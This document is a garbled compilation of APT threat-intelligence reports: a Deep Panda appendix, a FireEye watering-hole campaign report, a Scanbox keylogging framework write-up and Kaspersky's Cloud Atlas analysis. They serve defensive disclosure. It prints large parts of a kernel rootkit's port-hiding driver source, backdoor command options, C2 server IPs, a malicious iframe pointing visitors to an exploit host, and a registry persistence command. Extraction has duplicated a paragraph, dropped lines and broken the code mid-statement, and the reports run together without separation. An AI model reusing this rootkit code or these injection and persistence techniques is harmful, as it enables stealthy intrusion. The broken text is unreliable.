code appears to have been compiled on Sunday October 30, 2011 at 12:43:33 P.M. UTC (late evening time
in China). This sample has multiple communication capabilities available that makes it far more versatile
and stealthy. It implements relatively well thought out protocols including HTTP and DNS. The tool has the
ability to automatically down select the most effective communication channel once it has been instantiated,
which can help avoid detection from solutions like DNS blacklisting and RFC protocol enforcement. The
DLL itself contains traces of the original C++ class names that were utilized in the source code, which in
communicating to the C2, thus enhancing OPSEC. The sample contains 
dead code
 which appears to be
command and control server classes, this is likely an indicator that the C2 client which would communicate
with this sample shares the same communications library which was compiled into this sample.
System Driver
The kernel driver component dropped by the Backdoor DLL bears many tool marks associating it with the
CCRootkit package publicly by Steven Lai (a/k/a embedlinux). This kernel mode rootkit implements several
hooking techniques that are aimed at preventing a system administrator from detecting the backdoor DLL.
The implementation of these techniques has some unique idiosyncrasies that permit direct attribution to the
source code Steven Lai posted. This driver attempts to hide a wide swath of TCP ports (40000-45000) for
an unknown reason, however it is suspected that this may relate to the potential network relaying capability
alluded to for the backdoor dll.
System Driver
The kernel driver component dropped by the Backdoor DLL bears many tool marks associating it with the
CCRootkit package publicly by Steven Lai (a/k/a embedlinux). This kernel mode rootkit implements several
hooking techniques that are aimed at preventing a system administrator from detecting the backdoor DLL.
The implementation of these techniques has some unique idiosyncrasies that permit direct attribution to the
source code Steven Lai posted. This driver attempts to hide a wide swath of TCP ports (40000-45000) for
an unknown reason, however it is suspected that this may relate to the potential network relaying capability
alluded to for the backdoor dll.
 CROWDSTRIKE                                                                      S E N S I T I VE         26
DEEP PANDA
                                            APPENDIX
Appendix A: Command Line Options for Post Exploitation Tool Sample (MD5:
2dce7fc3f52a692d8a84a0c182519133
        iu - impersonate user, iu represents a username and expects the following additional arguments.
                 id -domain
                 ip -password
        f - perform command based on value. Possible values listed below
                 sh - Connect to C2.
                         x - hostname, connect to http address to download
                                  y - port
                                  u - username
                                  w - password
                         l - set up listener
                                  s - hostname
                                  p - port
                 v - display communication protocol version
                 dl
                         url - url to download from.
               ul
                      url - url to upload to.
               cl
               as to hide the tampering.
                       p - target path
                       m
               tu
               date of 11-30-2005:12:00:00 with the UTC offset of the system applied.
                       p - target path
                       m
                       r
               d
                       t
               wmi - perform Windows Management Instrumentation (WMI) command
                       s - machine
                       u - username
                       p - password
                      m - can be one of the following 3 items
 CROWDSTRIKE                                                                  S E N S I T I VE            27
DEEP PANDA
Appendix B: Algorithm for computing machine ID
 char ch = 
 foreach(char ch2 in Environment.MachineName)
     ch = (char)(ch ^ ch2);
 byte num3 = (byte)ch;
 return (GetVolumeSerial() ^ (uint)(((num3 + (num3 * 0x100)) + (num3 *
 0x10000)) +
                       (num3 * 0x1000000)));
Appendix C: Remote Commands Supported by .NET Backdoor Post Exploita-
tion Tool Sample
public class RcDataCommand
  public byte channelHint;
  public RcDataCommandId cmdID;
  public RcDataCommandType cmdType;
  public string extraInfo;
  public string string_0;
Implemented values for cmdID are as follows:
 CROWDSTRIKE                                                S E N S I T I VE   28
DEEP PANDA
cmdType can be one of the following (Interesting commands explained in detail):
 CROWDSTRIKE                                                                      S E N S I T I VE   29
DEEP PANDA
 string_0 can have one of the following values dependant upon command id and type.
Appendix D: Raw bytes of example Authentication packet.
       03 01 74 80 82 21 b5 64 c2 74 22 e3 02 00 00 00 49 03 00 00 00 00 00 00 00 00 00 00 00
       00 00 00
Appendix E: Initialization of KEY and IV for AES
           for (int i = 0; i < 0x20; ++i )
           {       for (int i = 0; i < 0x20; ++i )
           {
               buffer[i] = (byte)((i + 8) + ((byte)password[num++]));
               buffer[i] = (byte)(buffer[i] ^ 170);
               num = num % password.Length;
 CROWDSTRIKE                                                                  S E N S I T I VE   30
DEEP PANDA
Appendix F: Command & Control Servers
C2 Server   Port   Geolocation   Whois                Samples Used In
1.9.5.38    443    Bukit         inetnum:       1.9.0.0 - 47619fca20895abc83807321cbb80a3d
                                 1.9.255.255
                   Mertajam,     netname:
                   Maylasia      TMNET-AS-AP
                                 descr:        Tmnet,
                                 Telekom Malaysia
                                 Bhd.
                                 descr:        Telekom
                                 Malaysia Berhad
                                 descr:        44th
                                 Floor, Global Data
                                 Marketing, TM Global
                                 descr:        Jalan
                                 Pantai Baharu
                                 country:       MY
                                 admin-c:       TA35-
                                 AP
                                 tech-c:     TA35-AP
                                 mnt-by:       AP-
                                 NIC-HM
                                 mnt-lower:      TM-
                                 NET-AP
                                 mnt-routes: TM-
                                 NET-AP
                                 status:      ALLO-
                                 CATED PORTABLE
                                 remarks:       -+-+-+-
                                 +-+-+-+-+-+-+-+-++-+-
                                 +-+-+-+-+-+-+-+-+-+-
                                 +-+-+
                                 remarks:       This
                                 object can only be
                                 updated by APNIC
                                 hostmasters.
                                 remarks:       To
                                 update this object,
                                 please contact APNIC
                                 remarks:       host-
                                 masters and include
                                 your organisation
                                 account
                                 remarks:       name in
                                 the subject line.
                                 remarks:       -+-+-+-
                                 +-+-+-+-+-+-+-+-++-+-
                                 +-+-+-+-+-+-+-+-+-+-
                                 +-+-+
                                 changed:        hm-
                                 changed@apnic.net
                                 20100610
                                 source:    APNIC
 CROWDSTRIKE                                                         S E N S I T I VE        31
DEEP PANDA
C2 Server      Port   Geolocation   Whois              Samples Used In
202.86.190.3   80     Hong Kong     inetnum:            2dce7fc3f52a692d8a84a0c182519133
                                    202.86.190.0 -
                                    202.86.191.255      de7500fc1065a081180841f32f06a537
                                    netname:      Tele-
                                    One-HK
                                    country:    HK
                                    descr:     Te-
                                    leOne(HK) Limited
                                    admin-c:     HL13
                                    tech-c:    AC612-AP
                                    status:    AS-
                                    SIGNED NON-POR-
                                    TABLE
                                    changed:      an-
                                    gus@edu.ctm.net
                                    20041122
                                    mnt-by:     MAINT-
                                    CTM-MO
                                    source:     APNIC
Appendix G: Edward Sun
s kernel network hook code
           : [   ]NSI Module Hook : Hiding Port Under Windows Vista [                 ]
         : eviloctal       : 2007-7-8 20:53         : [    ]NSI Module
Hook : Hiding Port Under Windows Vista
                             http://rootkit.com/newsread_print.php?newsid=735
                               (www.eviloctal.com)
cardmagic writes: Windows Vista has changed alot on network module, many old
port hiding materials are no longer usable.
In this post, I will share with you a simple code to hide port under Vista,hope
it is useful for some guys .
Actually under Windows Vista, netstat.exe will call InternalGetTcpTable2 which
is exported by Iphlpapi.dll to list all open ports,then InternalGetTcpTable2
will transfer control to NsiAllocateAndGetTable which is exported by nsi.dll,
kernel mode module of NSI -- nsiproxy.sys. nsiproxy.sys is almost like a
wrapper of netio.sys, it will then call internal subroutines of netio.sys .
Here ,we will use a relatively easy way -- 
NSI Kernel Module Dispatch Routine
is an old topic, this time ,we will apply this method to nsiproxy.sys. Please
Check the following code(Notice: I only tested it under Windows Vista RTM
32bit):
 CROWDSTRIKE                                                          S E N S I T I VE     32
DEEP PANDA
   :
///////////////////////////////////////////////////////////////////////////////
////////
// Filename: PortHidDemo_Vista.c
// Author: CardMagic(Edward)
// Email: [email]sunmy1@sina.com[/email]
// Description:
//      A Demostration Of Hiding
//   Tested Under Windows Vista Kernel Version 6000 MP (1 procs) Free x86 com-
patible
#include 
stdlib.h
#include 
ntifs.h
unsigned short htons(unsigned short hostshort);
unsigned long inet_addr(const char *name);
typedef unsigned long DWORD;
PDRIVER_DISPATCH orgNsiDeviceIoControl = 0;
DWORD gLocalPort=0,gLocalIp=0;
typedef struct _HP_CONTEXT
  PIO_COMPLETION_ROUTINE oldIocomplete;
  PVOID oldCtx;
  BOOLEAN bShouldInvolve;
  PKPROCESS pcb;
}HP_CONTEXT,*PHP_CONTEXT;
 CROWDSTRIKE                                                S E N S I T I VE     33
DEEP PANDA
}INTERNAL_TCP_TABLE_SUBENTRY,*PINTERNAL_TCP_TABLE_SUBENTRY;
typedef struct _INTERNAL_TCP_TABLE_ENTRY
  INTERNAL_TCP_TABLE_SUBENTRY localEntry;
  INTERNAL_TCP_TABLE_SUBENTRY remoteEntry;
}INTERNAL_TCP_TABLE_ENTRY,*PINTERNAL_TCP_TABLE_ENTRY;
typedef struct _NSI_STATUS_ENTRY
}NSI_STATUS_ENTRY,*PNSI_STATUS_ENTRY;
typedef struct _NSI_PARAM
  //
  // Total 3CH size
  //
  DWORD UnknownParam1;
  DWORD UnknownParam2;
  DWORD UnknownParam3;
  DWORD UnknownParam4;
  DWORD UnknownParam5;
  DWORD UnknownParam6;
  PVOID lpMem;
  DWORD UnknownParam8;
  DWORD UnknownParam9;
  DWORD UnknownParam10;
  PNSI_STATUS_ENTRY lpStatus;
  DWORD UnknownParam12;
  DWORD UnknownParam13;
  DWORD UnknownParam14;
  DWORD TcpConnCount;
}NSI_PARAM,*PNSI_PARAM;
unsigned short htons(unsigned short a)
   unsigned short b = a;
   b = ( b << 8 );
   a = ( a >> 8 );
   return ( a | b );
 CROWDSTRIKE                                                  S E N S I T I VE   34
DEEP PANDA
unsigned long inet_addrt(const char* name)
    int len = strlen(name);
    unsigned long temp_val[4];
    char namesec[10] ;
    {
        memset(namesec,0,10);
        if(&#39;.&#39; == name[i])
        {
          if(p)
            strncpy(namesec,name+p+1,i-p);
          else
            strncpy(namesec,name,i);
            p = i;
        }
    }
    strncpy(namesec,name+p+1,i-p);
    return (temp_val[0]|(temp_val[1]<<8)|(temp_val[2]<<16)|(temp_val[3]<<24));
NTSTATUS
HPCompletion(
            IN PIRP Irp,
            IN PVOID Context
            )
    PIO_STACK_LOCATION irpsp = IoGetCurrentIrpStackLocation(Irp);
    PIO_STACK_LOCATION irpspNext = IoGetNextIrpStackLocation(Irp);
    PHP_CONTEXT pCtx = Context;
    PNSI_PARAM nsiParam;
    int i;
    if(NT_SUCCESS(Irp->IoStatus.Status))
    {
 CROWDSTRIKE                                                  S E N S I T I VE   35
DEEP PANDA
nsiParam = Irp->UserBuffer;
    if(MmIsAddressValid(nsiParam->lpMem))
    {
      //
      // netstat will involve internal calls which will use
      // nsiParam structure
      //
      if( (nsiParam->UnknownParam8 == 0x38))
      {
         KAPC_STATE apcstate;
         PNSI_STATUS_ENTRY pStatusEntry = (PNSI_STATUS_ENTRY)nsiParam->lpStatus;
         PINTERNAL_TCP_TABLE_ENTRY pTcpEntry = (PINTERNAL_TCP_TABLE_ENTRY)nsi-
Param->lpMem;
         int nItemCnt = nsiParam->TcpConnCount;
        KeStackAttachProcess(pCtx->pcb,&apcstate);
        //
        //make sure we are in the context of original process
        //
        for(i = 0;i < nItemCnt;i ++)
        {
           if((pTcpEntry[i].localEntry.dwIP == gLocalIp)&&(pTcpEntry[i].localEn-
try.Port == gLocalPort))
           {
             //
             //NSI will map status array entry to tcp table array entry
             //we must modify both synchronously
             //
             RtlCopyMemory(&pTcpEntry[i],&pTcpEntry[i+1],sizeof(INTERNAL_TCP_TA-
BLE_ENTRY)*(nItemCnt-i));
             RtlCopyMemory(&pStatusEntry[i],&pStatusEntry[i+1],sizeof(NSI_STA-
TUS_ENTRY)*(nItemCnt-i));
             nItemCnt--;
             nsiParam->TcpConnCount --;
             i--;
           }
        }
              KeUnstackDetachProcess(&apcstate);
          }
      }
 CROWDSTRIKE                                                 S E N S I T I VE   36
DEEP PANDA
irpspNext->Context = pCtx->oldCtx;
  irpspNext->CompletionRoutine = pCtx->oldIocomplete;
    //
    //free the fake context
    //
    ExFreePool(Context);
    if(pCtx->bShouldInvolve)
    else
    {
      if (Irp->PendingReturned) {
         IoMarkIrpPending(Irp);
      }
      return STATUS_SUCCESS;
    }
NTSTATUS
               IN ULONG Attributes,
               IN PACCESS_STATE AccessState OPTIONAL,
               IN ACCESS_MASK DesiredAccess OPTIONAL,
               IN KPROCESSOR_MODE AccessMode,
               IN OUT PVOID ParseContext OPTIONAL,
               );
    LARGE_INTEGER waittime;
    waittime.QuadPart = -50*1000*1000;
                                                                           -
gNsiDeviceIoControl);
    //delay loading driver to make it more secure
    //
 CROWDSTRIKE                                            S E N S I T I VE       37
DEEP PANDA
KeDelayExecutionThread(KernelMode,0,&waittime);
    return STATUS_SUCCESS;
NTSTATUS HPDummyDeviceIoControl(
                     IN PIRP Irp
                     )
    ULONG     ioControlCode;
    PIO_STACK_LOCATION irpStack;
    ULONG     status;
    irpStack = IoGetCurrentIrpStackLocation(Irp);
    ioControlCode = irpStack->Parameters.DeviceIoControl.IoControlCode;
  if(IOCTL_NSI_GETALLPARAM == ioControlCode)
    if(irpStack->Parameters.DeviceIoControl.InputBufferLength == sizeof(NSI_
PARAM))
    {
      //
      //only care the related I/O
      //
      PHP_CONTEXT ctx = (HP_CONTEXT*)ExAllocatePool(NonPagedPool,sizeof(HP_CON-
TEXT));
      ctx->oldIocomplete = irpStack->CompletionRoutine;
      ctx->oldCtx = irpStack->Context;
      irpStack->CompletionRoutine = HPCompletion;
      irpStack->Context = ctx;
      ctx->pcb = IoGetCurrentProcess();
            if((irpStack->Control&SL_INVOKE_ON_SUCCESS) ==SL_INVOKE_ON_SUCCESS)
              ctx->bShouldInvolve = TRUE;
            else
              ctx->bShouldInvolve = FALSE;
            irpStack->Control |= SL_INVOKE_ON_SUCCESS;
        }
    }
 CROWDSTRIKE                                                      S E N S I T I VE   38
DEEP PANDA
    //call original I/O control routine
    //
    return status;
NTSTATUS DriverEntry(
           IN PUNICODE_STRING RegistryPath
            )
    int i;
    NTSTATUS status;
    UNICODE_STRING uniNsiDrvName;
#if DBG
    _asm int 3 //debug
#endif
    RtlInitUnicodeString(&uniNsiDrvName,L
\\Driver\\nsiproxy
                                                                   -
    if(!NT_SUCCESS(status))
    {
      return STATUS_SUCCESS;
    }
    //
    //store the original dispatch function of NSI driver
    //
    gLocalIp = inet_addrt(LOCALHIDEIP);
    gLocalPort = htons(LOCALHIDEPORT);
 CROWDSTRIKE                                                  S E N S I T I VE   39
DEEP PANDA
    //
    //hook NSI dispatch routine
    //
                                                     -
myDeviceIoControl);
    return STATUS_SUCCESS;
 CROWDSTRIKE                      S E N S I T I VE   40
DEEP PANDA
Appendix H: Command and Control MD5 Correlation
        MD5                                Command and Control Server
        47619fca20895abc83807321cbb80a3d   1.9.5.38:443
        2dce7fc3f52a692d8a84a0c182519133   202.86.190.3:80
        de7500fc1065a081180841f32f06a537   202.86.190.3:80
 CROWDSTRIKE                                                 S E N S I T I VE   41
Aided Frame, Aided Direction (Because it
s a redirect)
Introduction:
On September 24 2014, FireEye observed a new strategic web compromise (SWC) campaign that we
believe is targeting non-profit organizations and non-governmental organizations (NGO) by hosting
iframes on legitimate websites. The compromised websites contained an iframe to direct site visitors to a
threat actor-controlled IP address that dropped a Poison Ivy remote access tool (RAT) onto victims
systems. FireEye has not yet attributed this activity though we have identified links to the Sunshop Digital
Quartermaster, a collective of malware authors that supports multiple China-based advanced persistent
threat (APT) groups. FireEye previously established detection measures for this threat activity, ensuring
our clients were prepared for these intrusion attempts well in advance of threat actor implementation.
Activity Overview:
On September 24, FireEye observed SWCs, likely conducted by a unitary threat group based on shared
infrastructure and tools, on at least three different websites: an international non-profit organization that
focuses on environmental advocacy, and two different NGOs that promote democracy and human rights.
The group was able to compromise these websites and insert malicious iframes. Figure 1 displays one of
the iframes. The threat group obfuscated the iframe on two of the compromised websites.
 <div class=
views-field views-field-body
>  <div class=
field-
 content
><p><iframe height=
 src=
http://103.27.108.45/img/js.php
 width=
></iframe></p>
Figure 1: The iframe that directed website visitors to a threat actor-controlled IP address
The iframes on these websites directed visitors to Java exploits hosted at 103.27.108.45. In turn, these
exploits downloaded and decoded a payload hosted at: hxxp://103.27.108.45/img/js.php. A GET request
to this URI returned the following content:
<applet code=
NvTest.class
,height=
 width=
.<param name=
 value=
4D5A90
Figure 2: The encoded payload (snipped for brevity)
The 
 param shown in Figure 2 is decoded from ASCII into hex by the Java exploit. Once decoded,
FireEye identified the payload as a Poison Ivy variant. It had the following properties:
MD5            118fa558a6b5020b078739ef7bdac3a1
Size           25608 bytes
Compile Time         2014 09 15 08:21:23
Import Hash          09d0478591d4f788cb3e5ea416c25237
The Poison Ivy variant was also code signed with the below certificate:
SHA1               47:8C:E3:D6:CC:17:60:D3:27:14:6A:36:C9:88:77:4D:27:83:6A:D4
MD5                 82B582589D4A59BE0720F088ACAC67A3
Serial Number             581AE6B6ABAFD73AC85B1AEFBDB2555F
Common Name                zilliontek Co.,Ltd
Organization          zilliontek Co.,Ltd
Country              KR
State/Province         Gyeonggi-do
City               Suwon-si
Issue Date           Jan 12 00:00:00 2013 GMT
Expiration Date           Feb 20 23:59:59 2015 GMT
The backdoor also contained the below versioning info embedded in the RT_VERSION of one of the PE
resources:
LegalCopyright: Copyright 2012 Google Inc. All rights reserved.
InternalName: chrome_exe
ProcuctShortName: Chrome
FileVersion: 34.0.1847.131
CompanyName: Google Inc.
OrginaLFilename: chrome.exe
LegalTrademarks:
ProductName: Google Chrome
ComparyShortName: Google
LastChange: 265687
FileDescription: Google Chrome
Offcial Build: 1
PriductVersion: 34.0.1847.131
Translation: 0
0409 0x04b0
This versioning info attempted to masquerade as a Google Chrome file. However, the malware author
misspelled multiple words when attempting to put in versioning information for this particular build.
The Poison Ivy implant had the following configuration properties:
C2: quakegoogle.servequake.com, Port: 80
Password: qeTGd3485fF
Mutex: )!VoqA.I4
The C2 domain quakegoogle.servequake[.]com resolved to 115.126.62.100 at the time of the SWCs. Other
domains resolving to the same IP include the following:
 assign.ddnsking.com
 quakegoogle.servequake.com
 picsgoogle.servepics.com
Figure 3: Domains observed resolving to 115.126.62.100
Between August 30, 2014 and September 16, 2014 we also observed SOGU (aka Kaba) callback traffic sent
to assign.ddnsking.com over port 443.
Links to the Sunshop Digital Quartermaster
The Poison Ivy backdoor also had a RT_MANIFEST PE resource with a SHA256 fingerprint of
82a98c88d3dd57a6ebc0fe7167a86875ed52ebddc6374ad640407efec01b1393.
This same RT_MANIFEST resource was documented in our previous Sunshop Digital Quartermaster
report. FireEye previously identified this specific RT_MANIFEST as the 
Sunshop Manifest,
 and we have
observed this same manifest resource used in 86 other samples. As we stated in the Quartermaster report,
we believe this shared resource is an artifact of a builder toolkit made available to a number of China-
based APT groups.
Conclusion
This activity represents a new SWC campaign. We suspect threat actors are leveraging their access to
compromised websites belonging to NGOs and non-profits to target other organizations in the same
industries. These websites are often visited by organization employees and other organizations in the same
industries, allowing threat actors to move laterally within already compromised networks or gain access to
new networks. While FireEye has not attributed this activity to a specific threat group, we frequently
observe China-based threat actors target non-profits and NGOs, and we suspect that they seek to monitor
activity within their borders that may lead to domestic unrest or embarrass the Chinese government. For
example, in 2013, FireEye observed China-based threat actors steal grant applications and activity reports
specifically related to an international NGO
s China-based activities. We suspects threat actors sought to
monitor these programs and involved individuals. The three organizations whose websites are hosting the
malicious iframes have China-based operations.
FireEye is releasing information on this campaign to allow organizations to investigate and prepare for
this activity in their networks. We believe non-profits and NGOs remain at elevated risk of intrusion and
should be especially wary of attempts to compromise their networks using SWC. Threat actors may use
SWCs to achieve this goal, but FireEye does not discount the possibility that threat actors will use other
means at their disposal, including phishing. Based on past threat actor activity in this industry, FireEye
expects threat actors are motivated to steal programmatic data and monitor organizations
 programs in
specific countries. If China-based threat actors are behind the observed campaign, FireEye expects that
organizations with operations in China are high-priority targets. FireEye currently has detection measures
in place that should allow users of FireEye products to detect this SWC activity. It is also likely that other
industries or organizations were affected by this SWC activity, since these sites are public facing and
frequently visited.
Special thanks to Google
s Billy Leonard for providing additional information and research.
Thanks to the following authors for their contributions: Mike Oppenheim, Ned Moran, and Steve Stone.
This entry was posted in Threat Intelligence, Threat Research by Sarah Engle and Ben Withnell.
Bookmark the permalink.
Scanbox: A Reconnaissance Framework Used with Watering Hole
Attacks
A few days ago we detected a watering hole campaign in a website owned by one big industrial company.
The website is related to software used for simulation and system engineering in a wide range of
industries, including automotive, aerospace, and manufacturing.
The attackers were able to compromise the website and include code that loaded a malicious Javascript
file from a remote server. This Javascript file is a framework for reconnaissance that the attackers call
"Scanbox" and includes some of the techniques we described in a previous blog post: Attackers abusing
Internet Explorer to enumerate software and detect security products
The Scanbox framework first configures the remote C&C server that it will use and collects a small amount
of information about the victim that is visiting the compromised website including:
      Referer
      User-Agent
      Location
      Cookie
      Title (To identify specific content that the victim is visiting)
      Domain
      Charset
      Screen width and height
      Operating System
      Language
Resulting in something like this:
Before sending the information to the C&C server, Scanbox encodes and encrypts the data with the
following function:
Producing the following request:
If we decrypt the data it translates to:
After the first request, the framework contains several plugins to extract different information from the
victim.
Pluginid 1: Enumerates software installed in the system using the technique we explained before that
affects Internet Explorer. It also checks if the system is running different versions of EMET (Enhanced
Mitigation Experience Toolkit):
Producing the list of security software on the target
Pluginid 2: Enumerates Adobe Flash versions
Pluginid 5: Enumerates Microsoft Office versions
Pluginid 6: Enumerates Acrobat Reader versions
Pluginid 8: Enumerates Java versions
Pluginid 21: Implements a 
keylogger
 functionality trough Javascript that logs all the keystrokes the
victim is typing inside the compromised website.
While the user is browsing the compromised website, all keystrokes are being recorded and sent to the
C&C periodically. It will also send keystrokes when the user submits web forms that can potentially
include passwords and other sensitive data.
As we have seen, this is a very powerful framework that gives attackers a lot of insight into the potential
targets that will help them launching future attacks against them.
We have also seen several Metasploit-produced exploits that target different versions of Java in the same
IP address that hosts the Scanbox framework (122.10.9[.]109).
We recommend you look for this type of activity against the following machines in your network:
      mail[.]webmailgoogle.com
      js[.]webmailgoogle.com
      122[.]10.9.109
Cloud Atlas: RedOctober APT is back in style
Two years ago, we published our research into RedOctober, a complex cyber-espionage operation
targeting diplomatic embassies worldwide. We named it RedOctober because we started this investigation
in October 2012, an unusually hot month.
After our announcement in January 2013, the RedOctober operation was promptly shut down and the
network of C&Cs was dismantled. As usually happens with these big operations, considering the huge
investment and number of resources behind it, they don't just "go away" forever. Normally, the group goes
underground for a few months, redesigns the tools and the malware and resume operations.
See:
       RedOctober Part 1
       RedOctober Part 2
Since January 2013, we've been on the lookout for a possible RedOctober comeback. One possible hit was
triggered when we observed Mevade, an unusual piece of malware that appeared late in 2013. The Mevade
C&C name styles as well as some other technical similarities indicated a connection to RedOctober, but the
link was weak. It wasn't until August 2014 that we observed something which made us wonder if
RedOctober is back for good.
Meet Cloud Atlas
In August 2014, some of our users observed targeted attacks with a variation of CVE-2012-0158 and an
unusual set of malware. We did a quick analysis of the malware and it immediately stood out because of
certain unusual things that are not very common in the APT world.
Some of the filenames used in the attacks included:
       FT - Ukraine Russia's new art of war.doc
       
.doc
       Diplomatic Car for Sale.doc
       
.doc
       Organigrama Gobierno Rusia.doc
       
.doc
       
.doc
       
 (25-26.09.14).doc
       
.doc
      
.doc
      
.doc
      Car for sale.doc
      Af-Pak and Central Asia's security issues.doc
At least one of them immediately reminded us of RedOctober, which used a very similarly named
spearphish: "Diplomatic Car for Sale.doc". As we started digging into the operation, more details emerged
which supported this theory.
Perhaps the most unusual fact was that the Microsoft Office exploit didn't directly write a Windows PE
backdoor on disk. Instead, it writes an encrypted Visual Basic Script and runs it.
                                  Cloud Atlas exploit payload - VBScript
This VBScript drops a pair of files on disk - a loader and an encrypted payload. The loader appears to be
different every time and internal strings indicate it is "polymorphically" generated. The payload is always
encrypted with a unique key, making it impossible to decrypt unless the DLL is available.
We observed several different spear-phishing documents that drop uniquely named payloads. For
instance, the "qPd0aKJu.vbs" file MD5:
E211C2BAD9A83A6A4247EC3959E2A730 drops the following files:
DECF56296C50BD3AE10A49747573A346 - bicorporate - encrypted payload
D171DB37EF28F42740644F4028BCF727 - ctfmonrn.dll - loader
The VBS also adds a registry key:
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\ setting the
key "bookstore" to the value "regsvr32 %path%\ctfmonrn.dll /s", which ensures the malware runs every
time at system boot.
Some of the DLL names we observed include:
f4e15c1c2c95c651423dbb4cbe6c8fd5 - bicorporate.dll
649ff144aea6796679f8f9a1e9f51479 - fundamentive.dll
40e70f7f5d9cb1a669f8d8f306113485 - papersaving.dll
58db8f33a9cdd321d9525d1e68c06456 - previliges.dll
f5476728deb53fe2fa98e6a33577a9da - steinheimman.dll
Some of the payload names include:
steinheimman
papersaving
previliges
fundamentive
bicorporate
miditiming
damnatorily
munnopsis
arzner
redtailed
roodgoose
acholias
salefians
wartworts
frequencyuse
nonmagyar
shebir
getgoing
The payload includes an encrypted configuration block which contains information about the C&C sever:
The information from the config includes a WebDAV URL which is used for connections, a username and
password, two folders on the WebDAV server used to store plugins/modules for the malware and where
data from the victim should be uploaded.
C&C communication
The Cloud Atlas implants utilize a rather unusual C&C mechanism. All the malware samples we've seen
communicate via HTTPS and WebDav with the same server "cloudme.com", a cloud services provider.
According to their website, CloudMe is owned and operated by CloudMe AB, a company based in
Link
ping, Sweden.
(Important note: we do not believe that CloudMe is in any way related to the Cloud Atlas group - the
attackers simply create free accounts on this provider and abuse them for command-and-control).
Each malware set we have observed so far communicates with a different CloudMe account though. The
attackers upload data to the account, which is downloaded by the implant, decrypted and interpreted. In
turn, the malware uploads the replies back to the server via the same mechanism. Of course, it should be
possible to reconfigure the malware to use any Cloud-based storage service that supports WebDAV.
Here's a look at one such account from CloudMe:
The data from the account:
The files stored in the randomly named folder were uploaded by the malware and contain various things,
such as system information, running processes and current username. The data is compressed with LZMA
and encrypted with AES, however, the keys are stored in the malware body which makes it possible to
decrypt the information from the C&C.
We previously observed only one other group using a similar method 
 ItaDuke 
 that connected to
accounts on the cloud provider mydrive.ch.
Victim statistics: top 5 infected countries
Similarities with RedOctober
Just like with RedOctober, the top target of Cloud Atlas is Russia, followed closely by Kazakhstan,
according to data from the Kaspersky Security Network (KSN). Actually, we see an obvious overlap of
targets between the two, with subtle differences which closely account for the geopolitical
changes in the region that happened during the last two years.
Interestingly, some of the spear-phishing documents between Cloud Atlas and RedOctober seem to exploit
the same theme and were used to target the same entity at different times.
Both Cloud Atlas and RedOctober malware implants rely on a similar construct, with a loader and the final
payload that is stored encrypted and compressed in an external file. There are some important differences
though, especially in the encryption algorithms used 
 RC4 in RedOctober vs AES in Cloud Atlas.
The usage of the compression algorithms in Cloud Altas and RedOctober is another interesting similarity.
Both malicious programs share the code for LZMA compression algorithm. In CloudAtlas it is used to
compress the logs and to decompress the decrypted payload from the C&C servers, while in Red October
the "scheduler" plugin uses it to decompress executable payloads from the C&C.
It turns out that the implementation of the algorithm is identical in both malicious modules, however the
way it is invoked is a bit different, with additional input sanity checks added to the CloudAtlas version.
Another interesting similarity between the malware families is the configuration of the build system used
to compile the binaries. Every binary created using the Microsoft Visual Studio toolchain has a special
header that contains information about the number of input object files and version information of the
compilers used to create them, the "Rich" header called so by the magic string that is used to identify it in
the file.
We have been able to identify several RedOctober binaries that have "Rich" headers describing exactly the
same layout of VC 2010 + VC 2008 object files. Although this doesn't necessarily mean that the binaries
were created on the same development computer, they were definitely compiled using the same version of
the Microsoft Visual Studio up to the build number version and using similar project configuration.
                                             Number of object
 Number of object      Number of object
                                             files,Red October     HEX compiler          Decoded compiler
 files, CloudAtlas     files, Red October
                                             Fileputexec           version               version
 loader                Office plugin
                                             plugin
                                                                                         VC 2010 (build
 01                    01                    01                    009D766F
                                                                                         30319)
                                                                                         VC 2010 (build
 01                    01                    01                    009B766F
                                                                                         30319)
                                                                                         VC 2010 (build
 22                    2E                    60                    00AB766F
                                                                                         30319)
 5B                    60                    A3                    00010000              
                                                                                         VC 2008 (build
 05                    07                    11                    00937809
                                                                                         30729)
                                                                                         VC 2010 (build
 72                    5C                    AD                    00AA766F
                                                                                         30319)
                                                                                         VC 2010 (build
 20                    10                    18                    009E766F
                                                                                         30319)
To summarize the similarities between the two:
                                         Cloud Atlas                    RedOctober
 Shellcode marker in spearphished
                                         PT@T                           PT@T
 documents
 Top target country                      Russia                         Russia
 Compression algorithm used for
                                         LZMA                           LZMA
 C&C communications
 C&C servers claim to be / redirect to   BBC (mobile malware)           BBC
                                                                        VC 2010 (build 30319) (some
 Compiler version                        VC 2010 (build 30319)
                                                                        modules)
Finally, perhaps the strongest connection comes from targeting. Based on observations from KSN, some
of the victims of RedOctober are also being targeted by CloudAtlas. In at least one case, the
victim's computer was attacked only twice in the last two years, with only two malicious
programs 
 RedOctober and Cloud Atlas.
These and other details make us believe that CloudAtlas represents a rebirth of the RedOctober attacks.
Conclusion
Following big announcements and public exposures of targeted attack operations, APT groups behave in a
predictable manner. Most Chinese-speaking attackers simply relocate C&C servers to a different place,
recompile the malware and carry on as if nothing happened.
Other groups that are more nervous about exposure go in a hibernation mode for months or years. Some
may never return using the same tools and techniques.
However, when a major cyber-espionage operation is exposed, the attackers are unlikely to completely
shut down everything. They simply go offline for some time, completely reshuffle their tools and return
with rejuvenated forces.
We believe this is also the case of RedOctober, which makes a classy return with Cloud
Atlas.
Kaspersky products detect the malware from the Cloud Atlas toolset with the following verdicts:
Exploit.Win32.CVE-2012-0158.j
Exploit.Win32.CVE-2012-0158.eu
Exploit.Win32.CVE-2012-0158.aw
Exploit.MSWord.CVE-2012-0158.ea
HEUR:Trojan.Win32.CloudAtlas.gen
HEUR:Trojan.Win32.Generic
HEUR:Trojan.Script.Generic
Trojan-Spy.Win32.Agent.ctda
Trojan-Spy.Win32.Agent.cteq
Trojan-Spy.Win32.Agent.ctgm
Trojan-Spy.Win32.Agent.ctfh
Trojan-Spy.Win32.Agent.cter
Trojan-Spy.Win32.Agent.ctfk
Trojan-Spy.Win32.Agent.ctfj
Trojan-Spy.Win32.Agent.crtk
Trojan-Spy.Win32.Agent.ctcz
Trojan-Spy.Win32.Agent.cqyc
Trojan-Spy.Win32.Agent.ctfg
Trojan-Spy.Win32.Agent.ctfi
Trojan-Spy.Win32.Agent.cquy
Trojan-Spy.Win32.Agent.ctew
Trojan-Spy.Win32.Agent.ctdg
Trojan-Spy.Win32.Agent.ctlf
Trojan-Spy.Win32.Agent.ctpz
Trojan-Spy.Win32.Agent.ctdq
Trojan-Spy.Win32.Agent.ctgm
Trojan-Spy.Win32.Agent.ctin
